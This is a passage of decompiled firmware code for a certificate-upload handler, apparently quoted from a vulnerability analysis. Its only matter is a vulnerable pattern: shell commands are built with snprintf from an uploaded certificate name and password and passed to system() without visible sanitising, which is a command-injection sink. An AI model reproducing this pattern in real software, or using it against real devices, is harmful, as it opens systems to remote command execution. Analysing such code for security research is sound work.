                    unlink(cer_filepath);
                    FUN_120022d68(local_40,0,"Upload file fail !!!");
                    return;
                  }
                }
                if ((var_mgmtmode_atoi == 1) &&
                   (lVar1 = check_cer_csr_match(cer_filepath,&local_328), lVar1 == 0)) {
                  FUN_120022d68(local_40,0,"Upload Fail !!!");
                }
                else {
                  if (var_mgmtmode_atoi == 2) {
                    var_CSRFile = FUN_12003a460(&uStack_1a6);
                    snprintf(openssl_cmd,0x100,"openssl x509 -in %s -out \"%s/%s\"",var_CSRFile,
                             "/mnt/log1/cer_file",var_cer_name);
                    system(openssl_cmd);
                    var_CSRFile = FUN_12003a460(&uStack_1a6);
                    snprintf(openssl_cmd,0x100,"openssl rsa -in %s -out \"%s/%s\" -passin pass:%s",
                             var_CSRFile,"/mnt/log1/key_file",var_cer_name,var_cer_pw_truncated);
                    system(openssl_cmd);
                  }
                  snprintf(openssl_cmd,0x100,
                           "openssl x509 -in \"%s/%s\" -noout -subject|cut -c 10- >  \"%s/%s\"",
                           "/mnt/log1/cer_file",var_cer_name,"/mnt/log1/cer_info_file",var_cer_name)
                  ;
                  system(openssl_cmd);
                  snprintf(openssl_cmd,0x100,
                           "openssl x509 -in \"%s/%s\" -noout -issuer |cut -c %d- >> \"%s/%s\"",
                           "/mnt/log1/cer_file",var_cer_name,9,"/mnt/log1/cer_info_file",
                           var_cer_name);
                  system(openssl_cmd);
                  snprintf(openssl_cmd,0x100,
                           "openssl x509 -noout -dates -in \"%s/%s\" >>  \"%s/%s\"",
                           "/mnt/log1/cer_file",var_cer_name,"/mnt/log1/cer_info_file",var_cer_name)
                  ;
                  system(openssl_cmd);
                  if (var_mgmtmode_atoi == 2) {
                    snprintf(openssl_cmd,0x100,"echo  \"%s/%s\" >> \"%s/%s\"","/mnt/log1/key_file",
                             var_cer_name,"/mnt/log1/cer_info_file",var_cer_name);
                    system(openssl_cmd);
                  }
                  else if (var_mgmtmode_atoi == 1) {
                    snprintf(openssl_cmd,0x100,"cat \"%s/%s.info\" |sed -n \'2,2p\' >>  \"%s/%s\"",
                             "/mnt/log1/csr_file",&local_328,"/mnt/log1/cer_info_file",var_cer_name)
                    ;
                    system(openssl_cmd);
                  }
                  FUN_120022d68(local_40,0,"All new settings are now active !!!");
                }
              }
            }
          }
          else {
            snprintf(openssl_cmd,0x100,"Upload Fail, label exceeds %d characters !!!",0x40);
            FUN_120022d68(local_40,0,openssl_cmd);
          }
        }
      }
    }
    else {
      snprintf(openssl_cmd,0x100,"Upload Fail, certificate filename exceeds %d characters !!!",0x40)
      ;
      FUN_120022d68(local_40,0,openssl_cmd);
    }
  }
  return;
}

``` 
